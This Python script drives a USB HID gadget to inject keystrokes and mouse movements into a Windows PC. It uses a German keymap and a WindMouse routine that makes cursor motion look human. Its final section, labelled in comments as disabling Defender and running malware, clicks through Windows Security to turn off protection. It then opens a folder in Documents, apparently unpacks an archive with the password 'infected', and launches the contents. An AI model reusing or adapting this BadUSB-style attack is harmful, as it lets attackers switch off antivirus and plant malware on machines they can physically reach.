# NOT IN USE ANYMORE


import time
import random
import numpy as np
def send_input(report, device):
    with open(device, "rb+") as fd:
        fd.write(report)

def send_input_keyboard(report):
    #print(report)
    send_input(report, "/dev/hidg0")

def send_input_mouse(report):
    #print(report)
    send_input(report, "/dev/hidg1")

# Define the HID reports for keyboard and mouse actions
commands = {
    # Alphabet (Kleinbuchstaben)
    "key_a": b'\x00\x00\x04\x00\x00\x00\x00\x00',
    "key_b": b'\x00\x00\x05\x00\x00\x00\x00\x00',
    "key_c": b'\x00\x00\x06\x00\x00\x00\x00\x00',
    "key_d": b'\x00\x00\x07\x00\x00\x00\x00\x00',
    "key_e": b'\x00\x00\x08\x00\x00\x00\x00\x00',
    "key_f": b'\x00\x00\x09\x00\x00\x00\x00\x00',
    "key_g": b'\x00\x00\x0a\x00\x00\x00\x00\x00',
    "key_h": b'\x00\x00\x0b\x00\x00\x00\x00\x00',
    "key_i": b'\x00\x00\x0c\x00\x00\x00\x00\x00',
    "key_j": b'\x00\x00\x0d\x00\x00\x00\x00\x00',
    "key_k": b'\x00\x00\x0e\x00\x00\x00\x00\x00',
    "key_l": b'\x00\x00\x0f\x00\x00\x00\x00\x00',
    "key_m": b'\x00\x00\x10\x00\x00\x00\x00\x00',
    "key_n": b'\x00\x00\x11\x00\x00\x00\x00\x00',
    "key_o": b'\x00\x00\x12\x00\x00\x00\x00\x00',
    "key_p": b'\x00\x00\x13\x00\x00\x00\x00\x00',
    "key_q": b'\x00\x00\x14\x00\x00\x00\x00\x00',
    "key_r": b'\x00\x00\x15\x00\x00\x00\x00\x00',
    "key_s": b'\x00\x00\x16\x00\x00\x00\x00\x00',
    "key_t": b'\x00\x00\x17\x00\x00\x00\x00\x00',
    "key_u": b'\x00\x00\x18\x00\x00\x00\x00\x00',
    "key_v": b'\x00\x00\x19\x00\x00\x00\x00\x00',
    "key_w": b'\x00\x00\x1a\x00\x00\x00\x00\x00',
    "key_x": b'\x00\x00\x1b\x00\x00\x00\x00\x00',
    "key_y": b'\x00\x00\x1d\x00\x00\x00\x00\x00',
    "key_z": b'\x00\x00\x1c\x00\x00\x00\x00\x00',

    # Alphabet (Großbuchstaben)
    "key_A": b'\x02\x00\x04\x00\x00\x00\x00\x00',
    "key_B": b'\x02\x00\x05\x00\x00\x00\x00\x00',
    "key_C": b'\x02\x00\x06\x00\x00\x00\x00\x00',
    "key_D": b'\x02\x00\x07\x00\x00\x00\x00\x00',
    "key_E": b'\x02\x00\x08\x00\x00\x00\x00\x00',
    "key_F": b'\x02\x00\x09\x00\x00\x00\x00\x00',
    "key_G": b'\x02\x00\x0a\x00\x00\x00\x00\x00',
    "key_H": b'\x02\x00\x0b\x00\x00\x00\x00\x00',
    "key_I": b'\x02\x00\x0c\x00\x00\x00\x00\x00',
    "key_J": b'\x02\x00\x0d\x00\x00\x00\x00\x00',
    "key_K": b'\x02\x00\x0e\x00\x00\x00\x00\x00',
    "key_L": b'\x02\x00\x0f\x00\x00\x00\x00\x00',
    "key_M": b'\x02\x00\x10\x00\x00\x00\x00\x00',
    "key_N": b'\x02\x00\x11\x00\x00\x00\x00\x00',
    "key_O": b'\x02\x00\x12\x00\x00\x00\x00\x00',
    "key_P": b'\x02\x00\x13\x00\x00\x00\x00\x00',
    "key_Q": b'\x02\x00\x14\x00\x00\x00\x00\x00',
    "key_R": b'\x02\x00\x15\x00\x00\x00\x00\x00',
    "key_S": b'\x02\x00\x16\x00\x00\x00\x00\x00',
    "key_T": b'\x02\x00\x17\x00\x00\x00\x00\x00',
    "key_U": b'\x02\x00\x18\x00\x00\x00\x00\x00',
    "key_V": b'\x02\x00\x19\x00\x00\x00\x00\x00',
    "key_W": b'\x02\x00\x1a\x00\x00\x00\x00\x00',
    "key_X": b'\x02\x00\x1b\x00\x00\x00\x00\x00',
    "key_Y": b'\x02\x00\x1d\x00\x00\x00\x00\x00',
    "key_Z": b'\x02\x00\x1c\x00\x00\x00\x00\x00',

    # Numbers
    "key_1": b'\x00\x00\x1e\x00\x00\x00\x00\x00',
    "key_2": b'\x00\x00\x1f\x00\x00\x00\x00\x00',
    "key_3": b'\x00\x00\x20\x00\x00\x00\x00\x00',
    "key_4": b'\x00\x00\x21\x00\x00\x00\x00\x00',
    "key_5": b'\x00\x00\x22\x00\x00\x00\x00\x00',
    "key_6": b'\x00\x00\x23\x00\x00\x00\x00\x00',
    "key_7": b'\x00\x00\x24\x00\x00\x00\x00\x00',
    "key_8": b'\x00\x00\x25\x00\x00\x00\x00\x00',
    "key_9": b'\x00\x00\x26\x00\x00\x00\x00\x00',
    "key_0": b'\x00\x00\x27\x00\x00\x00\x00\x00',

    # Special characters
    "key_enter": b'\x00\x00\x28\x00\x00\x00\x00\x00',
    "key_esc": b'\x00\x00\x29\x00\x00\x00\x00\x00',
    "key_backspace": b'\x00\x00\x2a\x00\x00\x00\x00\x00',
    "key_backslash": b'\x40\x00\x2d\x00\x00\x00\x00\x00',  # AltGr + ß
    "key_tab": b'\x00\x00\x2b\x00\x00\x00\x00\x00',
    "key_space": b'\x00\x00\x2c\x00\x00\x00\x00\x00',

    # German special characters
    "key_ss": b'\x00\x00\x2d\x00\x00\x00\x00\x00',  # "ß"
    "key_question": b'\x02\x00\x2d\x00\x00\x00\x00\x00',  # "?"
    "key_accent": b'\x00\x00\x2e\x00\x00\x00\x00\x00',  # "´"
    "key_grave": b'\x02\x00\x2e\x00\x00\x00\x00\x00',  # "`"
    "key_ue": b'\x00\x00\x2f\x00\x00\x00\x00\x00',  # "ü"
    "key_Ue": b'\x02\x00\x2f\x00\x00\x00\x00\x00',  # "Ü"
    "key_plus": b'\x00\x00\x30\x00\x00\x00\x00\x00',  # "+"
    "key_asterisk": b'\x02\x00\x30\x00\x00\x00\x00\x00',  # "*"
    "key_hash": b'\x00\x00\x32\x00\x00\x00\x00\x00',  # "#"
    "key_apostrophe": b'\x02\x00\x32\x00\x00\x00\x00\x00',  # "'"
    "key_oe": b'\x00\x00\x33\x00\x00\x00\x00\x00',  # "ö"
    "key_Oe": b'\x02\x00\x33\x00\x00\x00\x00\x00',  # "Ö"
    "key_ae": b'\x00\x00\x34\x00\x00\x00\x00\x00',  # "ä"
    "key_Ae": b'\x02\x00\x34\x00\x00\x00\x00\x00',  # "Ä"
    "key_comma": b'\x00\x00\x36\x00\x00\x00\x00\x00',  # ","
    "key_semicolon": b'\x02\x00\x36\x00\x00\x00\x00\x00',  # ";"
    "key_period": b'\x00\x00\x37\x00\x00\x00\x00\x00',  # "."
    "key_colon": b'\x02\x00\x37\x00\x00\x00\x00\x00',  # ":"
    "key_minus": b'\x00\x00\x38\x00\x00\x00\x00\x00',  # "-"
    "key_underscore": b'\x02\x00\x38\x00\x00\x00\x00\x00',  # "_"
    "key_less_than": b'\x00\x00\x64\x00\x00\x00\x00\x00',  # "<"
    "key_greater_than": b'\x02\x00\x64\x00\x00\x00\x00\x00',  # ">"

    "key_capslock": b'\x00\x00\x39\x00\x00\x00\x00\x00',
    "key_windows": b'\x08\x00\x00\x00\x00\x00\x00\x00',

    # Function keys
    "key_f1": b'\x00\x00\x3a\x00\x00\x00\x00\x00',
    "key_f2": b'\x00\x00\x3b\x00\x00\x00\x00\x00',
    "key_f3": b'\x00\x00\x3c\x00\x00\x00\x00\x00',
    "key_f4": b'\x00\x00\x3d\x00\x00\x00\x00\x00',
    "key_f5": b'\x00\x00\x3e\x00\x00\x00\x00\x00',
    "key_f6": b'\x00\x00\x3f\x00\x00\x00\x00\x00',
    "key_f7": b'\x00\x00\x40\x00\x00\x00\x00\x00',
    "key_f8": b'\x00\x00\x41\x00\x00\x00\x00\x00',
    "key_f9": b'\x00\x00\x42\x00\x00\x00\x00\x00',
    "key_f10": b'\x00\x00\x43\x00\x00\x00\x00\x00',
    "key_f11": b'\x00\x00\x44\x00\x00\x00\x00\x00',
    "key_f12": b'\x00\x00\x45\x00\x00\x00\x00\x00',

    # Control keys
    "key_ctrl": b'\x01\x00\x00\x00\x00\x00\x00\x00',
    "key_shift": b'\x02\x00\x00\x00\x00\x00\x00\x00',
    "key_alt": b'\x04\x00\x00\x00\x00\x00\x00\x00',
    "key_gui": b'\x08\x00\x00\x00\x00\x00\x00\x00',

    # Navigation keys
    "key_left": b'\x00\x00\x50\x00\x00\x00\x00\x00',
    "key_right": b'\x00\x00\x4f\x00\x00\x00\x00\x00',
    "key_up": b'\x00\x00\x52\x00\x00\x00\x00\x00',
    "key_down": b'\x00\x00\x51\x00\x00\x00\x00\x00',

    # Mausbewegungsbefehle
    'move_left': b'\x00\xFF\x00\x00',
    'move_right': b'\x00\x01\x00\x00',
    'move_up': b'\x00\x00\xFF\x00',
    'move_down': b'\x00\x00\x01\x00',
    'move_left_down': b'\x00\xFF\x01\x00',
    'move_left_up': b'\x00\xFF\xFF\x00',
    'move_right_down': b'\x00\x01\x01\x00',
    'move_right_up': b'\x00\x01\xFF\x00',
    'left_click': b'\x01\x00\x00\x00',
    'right_click': b'\x02\x00\x00\x00',
    'middle_click': b'\x04\x00\x00\x00',
    'release': b'\x00\x00\x00\x00'
}

# Create a mapping from characters to commands
char_to_command = {
    # Alphabet
    'a': "key_a",
    'b': "key_b",
    'c': "key_c",
    'd': "key_d",
    'e': "key_e",
    'f': "key_f",
    'g': "key_g",
    'h': "key_h",
    'i': "key_i",
    'j': "key_j",
    'k': "key_k",
    'l': "key_l",
    'm': "key_m",
    'n': "key_n",
    'o': "key_o",
    'p': "key_p",
    'q': "key_q",
    'r': "key_r",
    's': "key_s",
    't': "key_t",
    'u': "key_u",
    'v': "key_v",
    'w': "key_w",
    'x': "key_x",
    'y': "key_y",
    'z': "key_z",
    'A': "key_A",
    'B': "key_B",
    'C': "key_C",
    'D': "key_D",
    'E': "key_E",
    'F': "key_F",
    'G': "key_G",
    'H': "key_H",
    'I': "key_I",
    'J': "key_J",
    'K': "key_K",
    'L': "key_L",
    'M': "key_M",
    'N': "key_N",
    'O': "key_O",
    'P': "key_P",
    'Q': "key_Q",
    'R': "key_R",
    'S': "key_S",
    'T': "key_T",
    'U': "key_U",
    'V': "key_V",
    'W': "key_W",
    'X': "key_X",
    'Y': "key_Y",
    'Z': "key_Z",

    # Numbers
    '1': "key_1",
    '2': "key_2",
    '3': "key_3",
    '4': "key_4",
    '5': "key_5",
    '6': "key_6",
    '7': "key_7",
    '8': "key_8",
    '9': "key_9",
    '0': "key_0",

    # Special characters
    '-': "key_minus",
    '=': "key_equal",
    '[': "key_leftbracket",
    ']': "key_rightbracket",
    '\\': "key_backslash",
    ';': "key_semicolon",
    '\'': "key_apostrophe",
    '`': "key_grave",
    ',': "key_comma",
    '.': "key_period",
    '/': "key_slash",
    ' ': "key_space"
}

def execute_command(command):
    if command in commands:
        if "key_" in command:
            send_input_keyboard(commands[command])
            send_input_keyboard(b'\x00\x00\x00\x00\x00\x00\x00\x00')  # Release all keys
            time.sleep(random.uniform(0, 0.25))
        else:
            send_input_mouse(commands[command])
            send_input_mouse(b'\x00\x00\x00\x00')
    else:
        print(f"Unknown command: {command}")

# Do not use with normal commands (no check for errors)
def move_mouse_fast(command):
    send_input_mouse(commands[command])
    send_input_mouse(b'\x00\x00\x00\x00')


def type_word(word):
    for char in word:
        if char.isupper():
            send_input_keyboard(commands["key_shift"])  # Press Shift
            time.sleep(0.05)
            execute_command(char_to_command.get(char))
            send_input_keyboard(b'\x00\x00\x00\x00\x00\x00\x00\x00')  # Release key
            time.sleep(0.05)
        else:
            execute_command(char_to_command.get(char.lower()))


sqrt3 = np.sqrt(3)
sqrt5 = np.sqrt(5)

def move_left():
    move_mouse_fast("move_left")

def move_right():
    move_mouse_fast("move_right")

def move_up():
    move_mouse_fast("move_up")

def move_down():
    move_mouse_fast("move_down")

def move_up_right():
    move_mouse_fast("move_right_up")

def move_up_left():
    move_mouse_fast("move_left_up")

def move_down_right():
    move_mouse_fast("move_right_down")

def move_down_left():
    move_mouse_fast("move_left_down")

def wind_mouse(start_x, start_y, dest_x, dest_y, G_0=9, W_0=3, M_0=5, D_0=12, tolerance=1, move_mouse=lambda x, y: None):
    '''
    WindMouse algorithm. Calls the move_mouse kwarg with each new step.
    Released under the terms of the GPLv3 license.
    G_0 - magnitude of the gravitational force
    W_0 - magnitude of the wind force fluctuations
    M_0 - maximum step size (velocity clip threshold)
    D_0 - distance where wind behavior changes from random to damped
    tolerance - tolerance radius for the destination
    '''
    dest_x = dest_x * 1.035 # 1.758 for mousespeed 10 Multiplier for 1920x1080
    dest_y = dest_y * 1.035 # 1035 for 17
    current_x, current_y = start_x, start_y
    v_x = v_y = W_x = W_y = 0
    positions = [(current_x, current_y)]

    while (dist := np.hypot(dest_x - start_x, dest_y - start_y)) >= tolerance:
        W_mag = min(W_0, dist)
        if dist >= D_0:
            W_x = W_x / sqrt3 + (2 * np.random.random() - 1) * W_mag / sqrt5
            W_y = W_y / sqrt3 + (2 * np.random.random() - 1) * W_mag / sqrt5
        else:
            W_x /= sqrt3
            W_y /= sqrt3
            if M_0 < 3:
                M_0 = np.random.random() * 3 + 3
            else:
                M_0 /= sqrt5

        v_x += W_x + G_0 * (dest_x - start_x) / dist
        v_y += W_y + G_0 * (dest_y - start_y) / dist
        v_mag = np.hypot(v_x, v_y)

        if v_mag > M_0:
            v_clip = M_0 / 2 + np.random.random() * M_0 / 2
            v_x = (v_x / v_mag) * v_clip
            v_y = (v_y / v_mag) * v_clip

        start_x += v_x
        start_y += v_y
        move_x = int(np.round(start_x))
        move_y = int(np.round(start_y))

        if current_x != move_x or current_y != move_y:
            while current_x < move_x and current_y < move_y:
                move_down_right()
                current_x += 1
                current_y += 1
            while current_x < move_x and current_y > move_y:
                move_up_right()
                current_x += 1
                current_y -= 1
            while current_x > move_x and current_y < move_y:
                move_down_left()
                current_x -= 1
                current_y += 1
            while current_x > move_x and current_y > move_y:
                move_up_left()
                current_x -= 1
                current_y -= 1
            while current_x < move_x:
                move_right()
                current_x += 1
            while current_x > move_x:
                move_left()
                current_x -= 1
            while current_y < move_y:
                move_down()
                current_y += 1
            while current_y > move_y:
                move_up()
                current_y -= 1

    # Ensure final position is exactly at the destination
    positions.append((dest_x, dest_y))
    return positions



# Commands
# Malware is here:
# C:\Users\BA-LK\Documents

# Defender deaktiveren
execute_command("key_windows")
type_word("Sicherheit")
execute_command("key_enter")
time.sleep(2)
execute_command("key_enter")
time.sleep(1)
for i in range(7):
    time.sleep(0.5)
    execute_command("key_down")
execute_command("key_enter")
wind_mouse(0,0,-1920,-1080)
time.sleep(0.36)
wind_mouse(0,0,438, 394)
execute_command("left_click")
time.sleep(0.76)
wind_mouse(0,0,403,266)
execute_command("left_click")
time.sleep(0.26)

# Malware ausführen
execute_command("key_windows")
time.sleep(1)
execute_command("key_C")
execute_command("key_colon")
execute_command("key_backslash")
type_word("Users")
execute_command("key_backslash")
type_word("BA-LK")
execute_command("key_backslash")
type_word("Documents")
execute_command("key_backslash")
execute_command("key_enter")
wind_mouse(0,0,-1920,-1080)
wind_mouse(0,0,960,540)
wind_mouse(0,0,-350,-190)
execute_command("right_click")
time.sleep(0.76)
wind_mouse(0,0,150,90)
time.sleep(0.64)
wind_mouse(0,0,300,0)
time.sleep(0.39)
wind_mouse(0,0,0,70)
execute_command("left_click")
time.sleep(1.43)
type_word("infected")
execute_command("key_enter")
time.sleep(0.54)
wind_mouse(0,0,-40,-170)
execute_command("left_click")
execute_command("left_click")
time.sleep(3.12)
wind_mouse(0,0,-151,350)
execute_command("left_click")

